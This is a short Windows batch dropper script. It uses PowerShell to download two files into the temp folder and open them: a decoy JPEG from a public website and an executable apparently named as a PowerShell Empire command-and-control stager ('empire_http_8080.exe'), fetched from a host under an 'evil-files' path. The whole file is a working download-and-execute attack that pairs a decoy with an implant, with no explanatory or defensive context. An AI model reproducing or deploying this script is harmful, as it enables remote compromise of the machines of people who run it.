@echo off

set files='https://www.rd.com/wp-content/uploads/2021/03/GettyImages-140594401-1-scaled.jpg','https://192.168.122.108/evil-files/empire_http_8080.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"

